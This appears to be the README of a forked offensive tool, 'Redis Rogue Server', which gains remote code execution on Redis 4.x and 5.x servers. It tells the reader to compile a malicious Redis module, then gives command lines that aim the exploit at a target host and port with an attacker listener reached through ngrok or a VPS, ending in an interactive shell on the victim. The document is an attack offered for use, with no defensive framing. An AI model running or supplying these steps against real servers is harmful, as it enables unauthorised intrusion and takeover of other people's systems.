# Redis Rogue Server

A exploit for Redis 4.x and 5.x RCE, inspired by [Redis post-exploitation](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf).

## fork for using with tunneling
## Usage:

Compile .so from <https://github.com/n0b0dyCN/RedisModules-ExecuteCommand>.

Copy the .so file to same folder with `redis-rogue-server.py`.

run with ngrok 
```
# Terminal 1 - Start ngrok on local port 21000
ngrok tcp 21000

# Output shows: tcp://0.tcp.ap.ngrok.io:12973 -> localhost:21000

# Terminal 2 - Run exploit
python3 redis-rogue-server.py \
  --rhost <target address> \
  --rport <target port> \
  --lhost <ngrok address> \
  --lport <ngrok port> \
  --lport-local <local port> \
  --lbind <local address>
```

Run the rogue server:

```
python3 redis-rogue-server.py --rhost <target address> --rport <target port> --lhost <vps address> --lport <vps port>
```

The default target port is 6379 and the default vps port is 21000.

And you will get an interactive shell!
